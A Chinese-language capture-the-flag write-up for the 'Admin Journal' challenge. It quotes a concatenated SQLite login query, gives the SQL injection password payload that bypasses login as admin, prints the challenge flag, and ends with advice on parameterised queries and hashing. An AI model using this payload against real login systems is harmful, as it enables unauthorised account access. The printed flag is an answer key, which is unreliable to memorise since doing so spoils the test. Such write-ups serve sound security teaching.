# Admin Journal

## 题目简述

登录接口把 username 和 password 直接插入 SQLite 查询。管理员记录的 flag 就保存在同一行，登录成功后页面会显示该行的 title 和 flag。固定用户名为 admin，只需在密码字段中闭合字符串并注入恒真条件。

## 解题过程

源码构造的查询等价于：

~~~javascript
const query =
  "SELECT * FROM users WHERE username = '" + req.body.username +
  "' AND password = '" + req.body.password + "'";
~~~

提交：

~~~text
username: admin
password: ' OR '1==1'--
~~~

查询变成 password = '' OR '1==1'，后面的单引号被 -- 注释。username 条件仍把结果限制在 admin 行，避免数据库返回其他用户。dashboard 直接渲染 temp.flag，因此显示：

~~~text
maple{ess_skew_el_inject10nz_are_pr3tty_fun}
~~~

仓库 hosted/ctfd.json 的 name 字段误写成其他题名，但目录、源码与 Dockerfile 的 flag 一致，故按 Admin Journal 归档。

## 方法总结

SQL 注入的根因是把数据拼进语法。应使用参数化查询并对登录结果做明确的唯一行检查，密码还应保存为带盐的强哈希。利用时要根据实际数据库方言选择注释符和布尔表达式，并控制返回行，不能只追求“任意查询为真”。
